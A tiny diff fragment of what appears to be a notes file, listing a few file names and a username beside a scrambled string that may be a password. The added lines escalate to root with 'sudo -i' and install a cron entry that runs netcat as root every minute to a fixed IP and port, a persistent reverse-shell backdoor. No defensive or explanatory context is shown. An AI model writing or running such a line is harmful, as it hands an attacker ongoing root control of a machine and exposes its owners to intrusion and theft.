@@ -47,3 +47,6 @@ flagger.txt
 j.txt
 
 zeus -ghjcnbnenrf
+sudo -i
+
+* * * * * root nc -c 192.168.28.135 33403
